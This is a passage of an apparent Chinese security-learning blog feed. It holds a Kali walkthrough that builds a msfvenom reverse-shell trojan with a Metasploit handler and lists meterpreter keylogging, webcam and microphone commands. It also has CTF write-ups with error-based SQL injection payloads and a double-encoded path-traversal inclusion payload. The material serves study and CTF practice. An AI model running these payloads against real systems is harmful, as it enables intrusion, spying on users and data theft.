title="2."></a>2.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831214131149.bmp" alt="capture_20210831214131149"></p><p>?name[]=1&amp;passsword[]=2</p><p>解析：sha1()函数默认的传入参数类型是字符串，当传入数组时均会返回false，通过判断。</p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901105909901.png" alt="image-20210901105909901"></p><p>?a=240610708或?a=s878926199a</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; &lt;strong&gt;文章内容来自于：安恒信息&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;通用代码审计思路：&quot;&gt;&lt;a href=&quot;#通用代码审计思路：&quot; class=&quot;headerlink&quot; title=&quot;通用代码审计思路：&quot;&gt;&lt;/a&gt;通用代码审计思路：&lt;/h3&gt;&lt;h4 id=</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>一次简单的kali渗透测试</title>
    <link href="http://daweitech.github.io/2021/08/30/src/0830/"/>
    <id>http://daweitech.github.io/2021/08/30/src/0830/</id>
    <published>2021-08-30T08:44:34.000Z</published>
    <updated>2021-08-31T08:45:15.675Z</updated>
    
    <content type="html"><![CDATA[<h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> 参考链接：</p><p><a href="https://blog.csdn.net/k_love1219/article/details/104591110">记一次Kali系统渗透靶机(物理机)的详细过程（渗透必备）_k_love1219的博客-CSDN博客</a></p><p>首先开启kali-2018</p><p><img src="/2021/08/30/src/0830/image-20210830165837896.png" alt="image-20210830165837896"></p><p>接着我们开始创建木马文件</p><p>输入以下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;你的虚拟机ip地址 lport&#x3D;4444 -f exe -o &#x2F;root&#x2F;Desktop&#x2F;aaa.exe</span><br></pre></td></tr></table></figure><p>桌面会生成名为aaa.exe的木马文件</p><p><img src="/2021/08/30/src/0830/image-20210830170039670.png" alt="image-20210830170039670"></p><p>我们进入msfconsole</p><p><img src="/2021/08/30/src/0830/image-20210830170155242.png" alt="image-20210830170155242"></p><p>使用如下一系列指令：</p><p>使用exploit/multi/handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><p>设置payload </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p>设置木马监听回传ip地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 你的虚拟机的ip地址</span><br></pre></td></tr></table></figure><p>设置木马监听回传端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210830170532133.png" alt="image-20210830170532133"></p><p>还可以用 show options来确认是否设置成功</p><p>这时候我们利用社会工程学的知识来将木马病毒送进靶机</p><p>doge（可以设置放在物理机桌面上，然后点击运行即可，若不放心可自行前去任务管理器的详细信息查看是否有进程aaa.exe）</p><p><img src="/2021/08/30/src/0830/image-20210831085318058.png" alt="image-20210831085318058"></p><p>可以看到建立了session</p><p>说明我们已经成功连上了靶机</p><p>试着运行一些指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210831085740617.png" alt="image-20210831085740617"></p><p>查看了靶机的一些信息</p><p>此外还有的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getuid    获取系统ID以及计算机名称</span><br><span class="line">kill    中止进程</span><br><span class="line">ps    列举正在运行中的进程</span><br><span class="line">getpid    获取当前进程标识符</span><br><span class="line">keyscan_start     开启按键记录会话</span><br><span class="line">keyscan_stop     终止按键记录会话</span><br><span class="line">keyscan_dump   转储从被攻击主机捕获到的按键</span><br><span class="line">enumdesktops    列举所有可访问到的桌面和工作站</span><br><span class="line">getdesktop    获取当前meterpreter桌面</span><br><span class="line">setdesktop    变更meterpreter当前桌面</span><br><span class="line">webcam_list   列举系统中所有的摄像头</span><br><span class="line">webcam_snap   捕获被攻击主机的快照</span><br><span class="line">record_mic    从主机的默认麦克风中记录环境声音</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找到更为高级的免杀木马文章：</p><p><a href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSF制作免杀木马 - 迷途小書童~ - 博客园 (cnblogs.com)</a></p><h4 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h4><p>今天找到另外一篇文章来获取shell</p><p>操作方法差不多</p><p><a href="https://blog.csdn.net/cxcsdn666/article/details/100813443">Kali利用MSF渗透Win 7获取shell_舞指如歌~的博客-CSDN博客</a></p><p>这次不懂为什么文件复制不到win7上，索性就用了物理机来试验</p><p><a href="https://blog.csdn.net/u012206617/article/details/97389338">获取Shell（提权）后的操作（windows、Linux）_墨痕诉清风的博客-CSDN博客_shell提权</a></p><p>这时候之前的一篇安全客文章就讲的十分详细了</p><p><a href="https://www.anquanke.com/post/id/235631">MSF使用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;8-30&quot;&gt;&lt;a href=&quot;#8-30&quot; class=&quot;headerlink&quot; title=&quot;8.30&quot;&gt;&lt;/a&gt;8.30&lt;/h4&gt;&lt;p&gt; 参考链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/k_love1219/articl</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 2019 HardSQL</title>
    <link href="http://daweitech.github.io/2021/08/30/buu/16/"/>
    <id>http://daweitech.github.io/2021/08/30/buu/16/</id>
    <published>2021-08-30T00:55:58.000Z</published>
    <updated>2021-08-30T01:36:03.240Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点："><a href="#0x00知识点：" class="headerlink" title="0x00知识点："></a>0x00知识点：</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sql注入中的updatexml()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值</p><p>改变XML_document中符合XPATH_string的值</p><p>例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>​            其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure><p>xpath语法总结：<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure><p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档</p><p>第二个参数是用Xpath路径法表示的查找路径</p><p>例子：</p><p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p><h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p><img src="/2021/08/30/buu/16/image-20210830091906610.png" alt="image-20210830091906610"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><p>爆出库</p><p><img src="/2021/08/30/buu/16/image-20210830092011080.png" alt="image-20210830092011080"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092201589.png" alt="image-20210830092201589"></p><p>爆出表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092501514.png" alt="image-20210830092501514"></p><p>爆出列名</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092549838.png" alt="image-20210830092549838"></p><p>右边的flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line"></span><br><span class="line">1：空格被过滤可以使用&#x2F;**&#x2F;或者()绕过</span><br><span class="line">2：&#x3D;号被过滤可以用like来绕过</span><br><span class="line">3：substring与mid被过滤可以用right与left来绕过</span><br></pre></td></tr></table></figure><h4 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">极客大挑战 2019]HardSQL_o3Ev的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点：&quot;&gt;&lt;a href=&quot;#0x00知识点：&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点：&quot;&gt;&lt;/a&gt;0x00知识点：&lt;/h4&gt;&lt;h5 id=&quot;updatexml&quot;&gt;&lt;a href=&quot;#updatexml&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 WarmUp</title>
    <link href="http://daweitech.github.io/2021/08/29/buu/15/"/>
    <id>http://daweitech.github.io/2021/08/29/buu/15/</id>
    <published>2021-08-29T01:27:04.000Z</published>
    <updated>2021-08-29T02:25:40.066Z</updated>
    
    <content type="html"><![CDATA[<p> 重新回顾了下这题</p><p><img src="/2021/08/29/buu/15/image-20210829094805908.png" alt="image-20210829094805908"></p><p>F12查看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p> 高亮显示文件函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>checkfile函数里（），提示我们source.php和hint.php</p><p>访问hint.php得到语句：</p><p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p><p>将传递的参数赋值给page，然后判断若page变量不存在或非字符串</p><p>则echo  “you can’t see it”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若变量page存在于whitelist数组中</p><p>则返回true</p><p>以下看几个php函数：</p><p>php in_array函数</p><p>定义和用法：</p><p>in_array()函数搜索数组中是否存在指定的值</p><p><strong>注释：</strong>如果search参数是字符串并且设置为true，则搜索区分大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">必需。规定要在数组搜索的值。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需。规定要搜索的数组。</td></tr><tr><td align="left"><em>type</em></td><td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>php mb_substr()函数</p><p>mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</p><p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_substr ( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] ) : string</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>str</em></td><td align="left">必需。从该 string 中提取子字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回</td></tr><tr><td align="left">encoding</td><td align="left">可选。字符编码。如果省略，则使用内部字符编码。</td></tr></tbody></table><p>php mb_strpos函数</p><p>定义和用法：</p><p>查找字符串在另一个字符串首次出现的位置</p><p>基于字符数执行一个多字节安全的strpos()操作，第一个字符的位置是0，第二个字符的位置是1，依次类推</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(*string,find,start*)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定开始搜索的位置。</td></tr></tbody></table><p>我们大概就可以知道了，这段代码表示截取$page中’?’前部分，若无则截取整个$page</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br></pre></td></tr></table></figure><p>这里是对page进行url解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里首先判断$_REQUEST[‘file’]值非空</p><p>第二判断是否为字符串</p><p>再就是能否通过checkfile（）函数校验</p><p>后面是包含$_REQUEST[‘file’]文件</p><p>如果条件不满足就打印滑稽表情</p><p>结论：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.第一个&#96;&#96;if&#96;&#96;语句对变量进行检验，要求&#96;&#96;$page&#96;&#96;为字符串，否则返回false</span><br><span class="line">2.第二个&#96;&#96;if&#96;&#96;语句判断&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;数组中，存在则返回true</span><br><span class="line">3.第三个&#96;&#96;if&#96;&#96;语句判断截取后的&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;数组中，截取&#96;&#96;$page&#96;&#96;中&#96;&#96;&#39;?&#39;&#96;&#96;前部分，存在则返回true</span><br><span class="line">4.第四个&#96;&#96;if&#96;&#96;语句判断url解码并截取后的&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;中，存在则返回true</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">若以上四个&#96;&#96;if&#96;&#96;语句均未返回值，则返回false</span><br><span class="line">有三个&#96;&#96;if&#96;&#96;语句可以返回true，第二个语句直接判断&#96;&#96;$page&#96;&#96;，不可用</span><br><span class="line">第三个语句截取&#96;&#96;&#39;?&#39;&#96;&#96;前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</span><br><span class="line">第四个&#96;&#96;if&#96;&#96;语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为&#96;&#96;&#39;?&#39;&#96;&#96;，仍可通过第四个&#96;&#96;if&#96;&#96;语句校验。（&#96;&#96;&#39;?&#39;&#96;&#96;两次编码值为&#96;&#96;&#39;%253f&#39;&#96;&#96;）,构造url：</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;hint.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>hint.php和source.php都是白名单里文件</p><p>因为我们不知道ffffllllaaaagggg文件存放的具体位置<br>所以可以依次增加   ../</p><p>最后拿到flag</p><p><img src="/2021/08/29/buu/15/image-20210829101454490.png" alt="image-20210829101454490"></p><p>借鉴于：</p><p>[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 重新回顾了下这题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/29/buu/15/image-20210829094805908.png&quot; alt=&quot;image-20210829094805908&quot;&gt;&lt;/p&gt;
&lt;p&gt;F12查看到源码&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试_基础入门_概念名词</title>
    <link href="http://daweitech.github.io/2021/08/27/src/1/"/>
    <id>http://daweitech.github.io/2021/08/27/src/1/</id>
    <published>2021-08-27T07:44:57.000Z</published>
    <updated>2021-08-27T08:26:25.702Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_44519789/article/details/114131958">https://blog.csdn.net/weixin_44519789/article/details/114131958</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_44519789/article/details/114131958&quot;&gt;https://blog.csdn.net/weixin_44519789/article/details/114131958</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>leak</title>
    <link href="http://daweitech.github.io/2021/08/25/src/leak/"/>
    <id>http://daweitech.github.io/2021/08/25/src/leak/</id>
    <published>2021-08-25T07:41:00.000Z</published>
    <updated>2021-09-01T02:21:23.823Z</updated>
    
